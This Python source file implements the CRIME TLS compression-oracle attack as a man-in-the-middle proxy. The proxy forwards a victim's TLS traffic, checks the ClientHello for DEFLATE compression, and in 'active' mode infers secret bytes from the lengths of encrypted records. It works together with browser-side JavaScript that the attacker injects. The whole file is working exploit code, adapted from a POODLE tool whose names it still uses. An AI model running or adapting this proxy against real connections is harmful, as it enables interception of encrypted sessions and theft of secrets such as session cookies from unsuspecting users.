'''
    CRIME attack - exploit
    Implementation of the compression oracle attack behind CRIME
    Algo: RC4
    Author: mpgn <martial.puygrenier@gmail.com> - 2018
    @mpgn_x64
'''

import argparse
import binascii
import os
import re
import select
import socket
import socketserver
import struct
import sys
import threading

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    MAJ = '\033[45m'
    BLUE = '\033[44m'
    ORANGE = '\033[43m'
    CYAN = '\033[46m'
    RED = '\033[41m'
    GREEN = '\033[42m'
    YELLOW = '\033[100m'

class Poodle():

    def __init__(self):
        self.decipher = False
        self.nb_request = 0
        self.active = False
        self.previous = 0
        self.data_exploited = False
        self.compression_enabled = 0
        self.compression_type = "NULL"
        self.first_hello_done = 0
        self.char = 48
        self.first = ""

    def exploit(self, data_ssl):
        # a chrome hack: 
        #   value < 100 otherwise you will get lot of noise
        #   we only care about compressed data
        if  len(data_ssl) < 28:
            if self.first == "":
                print("first packed")
                self.first = data_ssl
            print('request ', str(self.nb_request), str(len(data_ssl)))
            self.nb_request += 1
            if len(data_ssl) == 24:
                print("FOUND CHAR", chr(self.char))
                data_ssl = self.first
            self.previous = len(data_ssl)
            self.data_exploited = True
            self.char += 1
        return data_ssl

    def info_traffic(self, color1, protocol, color2, status):
        print(''.rjust(int(columns)-18) + color1 + bcolors.BOLD + protocol + color2 + bcolors.BOLD + status + bcolors.ENDC)

class ProxyTCPHandler(socketserver.BaseRequestHandler):
    """ 
    The proxy respond to the CONNECT packet then just forward SSL packet to the server
    or the client. When active mode is enabled, the proxy alter the encrypted data send
    to the serveur
    """
    def handle(self):
    
        # Connection to the secure server
        socket_server = socket.create_connection((args.server, args.rport))
        # input allow us to monitor the socket of the client and the server
        inputs = [socket_server, self.request]
        running = True
        connect = True
        previous_content = 0
        while running:
            readable = select.select(inputs, [], [])[0]
            for source in readable:
                if source is socket_server:
                    try:
                        data = socket_server.recv(1024)
                    except socket.error as err:
                        break
                    # print 'Server -> proxy -> client'
                    if len(data) == 0:
                        running = False
                        break
                    (content_type, version, length) = struct.unpack('>BHH', data[0:5])
                    if content_type == 21:
                        # encrypted error
                        poodle.first_hello_done = 0
                        print("HMAC ERROR")
                    self.request.send(data)

                elif source is self.request:
                    if connect == True:
                        # print 'Client -> proxy'
                        data =  self.request.recv(1024)
                        connect = False
                        if 'CONNECT' in str(data):
                            data = "HTTP/1.0 200 Connection established\r\n\r\n"
                            self.request.send(data.encode())
                            break
                    else:
                        # print 'Client -> proxy -> server'
                        try:
                            ssl_header = self.request.recv(5)
                        except struct.error as err:
                            print("break")
                            break
                        if ssl_header == '':
                            running = False
                            break
                        try:
                            (content_type, version, length) = struct.unpack('>BHH', ssl_header)
                            # print(content_type, version, length)
                        except struct.error as err:
                            return
                        data = self.request.recv(length)
                        if content_type == 22 and poodle.first_hello_done == 0:
                            (handshake_type, length, lenght2, version) = struct.unpack('>BHBH', data[:6])
                            # 1: Client Hello
                            if handshake_type == 1:
                                random = struct.unpack('>32B', data[6:38])
                                session_id_length = struct.unpack('>B', data[38:39])
                                # print("session_id_length ", session_id_length)
                                session_id = struct.unpack('>32B', data[39:71])
                                # print("session_id ", session_id)
                                cipher_suites_length, = struct.unpack('>H', data[71:73])
                                # print("cipher_suites_length ", cipher_suites_length)
                                compression_method_length, = struct.unpack('>B', data[73+cipher_suites_length:73+cipher_suites_length+1])
                                #print("compression_method_length ", compression_method_length)
                                if compression_method_length == 1:
                                    print("No compression, this client is not vulnerable")
                                    poodle.active = False
                                    poodle.compression_enabled = 0
                                    poodle.compression_type = "   NULL  "
                                    poodle.info_traffic(bcolors.GREEN, poodle.compression_type, bcolors.BLUE, ' passive ')
                                elif compression_method_length == 2:
                                    poodle.compression_enabled = 1
                                    poodle.compression_type = " DEFLATE "
                                    poodle.info_traffic(bcolors.ORANGE, poodle.compression_type, bcolors.BLUE, ' passive ')

                                poodle.first_hello_done = 1

                        if poodle.active == True and content_type == 23:
                            data = poodle.exploit(data)
                        data_full = ssl_header+data
                        # we send data to the server
                        socket_server.send(data_full)
        return

if __name__ == '__main__':
    
    parser = argparse.ArgumentParser(description='Poodle Exploit by @mpgn_x64')
    parser.add_argument('proxy', help='ip of the proxy')
    parser.add_argument('port', type=int, help='port of the proxy')
    parser.add_argument('server', help='ip of the remote server')
    parser.add_argument('rport', type=int, help='port of the remote server')
    parser.add_argument('--start-block', type=int, default=1, help='start the attack at this block')
    parser.add_argument('--stop-block', type=int, default=0, help='stop the attack at this block')
    args = parser.parse_args()

    rows, columns = os.popen('stty size', 'r').read().split()
    # Create server and bind to set ip
    poodle = Poodle()
    socketserver.TCPServer.allow_reuse_address = True
    httpd = socketserver.TCPServer((args.proxy, args.port), ProxyTCPHandler)
    proxy = threading.Thread(target=httpd.serve_forever)
    proxy.daemon=True
    proxy.start()

    print('Proxy is launched on {!r} port {}'.format(args.proxy, args.port))
    print('Passive mode enabled by default')

    print('\nType help to show all command line, ' + bcolors.BLUE + bcolors.BOLD + 'passive' + bcolors.ENDC + ' mode is by default enabled\n')
    print(''.rjust(int(columns)-9) + bcolors.BLUE + bcolors.BOLD + ' passive ' + bcolors.ENDC)

    while True:
        try:
            input_u = input(bcolors.BOLD + "> " + bcolors.ENDC)
            if input_u == 'active':
                if poodle.compression_enabled == 1:
                    print('Active mode enabled, waiting for data... sendAttack()')
                    poodle.info_traffic(bcolors.ORANGE, poodle.compression_type, bcolors.RED, ' active  ')
                else:
                    print("No compression enabled, cannot active the exploit")
                poodle.active = True
            elif input_u == "passive":
                print('Passive mode enabled')
                poodle.active = False
            elif input_u == "help":
                print('~~~~Help command line~~~~\n')
                print(bcolors.BOLD + 'search' + bcolors.ENDC + ': find the block length (8 or 16). Use the command findlengthblock() in JS after launch this command')
                print(bcolors.BOLD + 'active' + bcolors.ENDC + ': active mode alter the data. Use the command sendAttack() in the JS after launch this command ')
                print(bcolors.BOLD + 'passive' + bcolors.ENDC + ': passive mode does not alter the data. Use the command reset() in the JS after launch this command ')
                print(bcolors.BOLD + 'exit' + bcolors.ENDC + ': show deciphered byte and exit the program properly')
                print(''.rjust(int(columns)-9) + bcolors.BLUE + bcolors.BOLD + ' passive ' + bcolors.ENDC)
            elif input_u == "exit":
                print("Exiting...")
                break
        except KeyboardInterrupt:
            print("Exiting...")
            print("Stopping proxy... bye bye")
            break

    # print("\n\033[32m{-} Deciphered plaintext\033[0m :", ('').join(poodle.secret))